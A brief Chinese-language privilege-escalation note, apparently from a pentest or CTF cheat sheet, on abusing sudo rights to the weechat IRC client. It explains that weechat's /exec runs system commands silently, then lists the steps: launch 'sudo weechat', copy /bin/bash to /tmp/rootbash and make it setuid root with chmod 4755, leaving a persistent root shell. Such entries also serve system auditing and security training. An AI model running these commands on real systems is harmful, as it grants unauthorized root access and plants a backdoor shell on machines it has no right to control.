可以以root权限启动weechat时可以得到root权限

weechat时irc客户端，内置/exec可以执行系统命令但无回显，退出代码为0代表成功执行

提权方式

```
sudo weechat

/exec cp /bin/bash /tmp/rootbash
/exec chmod 4755 /tmp/rootbash

```
